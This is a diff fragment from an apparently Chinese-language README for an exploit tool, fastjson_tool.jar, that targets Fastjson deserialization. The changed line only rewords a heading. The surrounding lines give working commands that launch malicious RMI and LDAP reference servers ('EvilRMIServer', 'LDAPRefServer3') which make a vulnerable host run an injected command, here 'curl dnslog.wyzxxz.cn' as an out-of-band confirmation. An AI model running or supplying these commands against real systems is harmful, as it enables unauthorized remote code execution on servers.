@@ -5,7 +5,7 @@
 java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
 :使用 EvilRMIServer 创建一个rmi服务, rmi的端口为1099，另一个socket通信的端口8888，后面写要执行的命令。
 
-2. 启动LDAP或者RMI服务+HTTP服务 (4和5的结合)
+2. 启动LDAP/RMI服务和HTTP服务 (4和5的结合)
 java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
 或
 java -cp fastjson_tool.jar EvilRMIServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
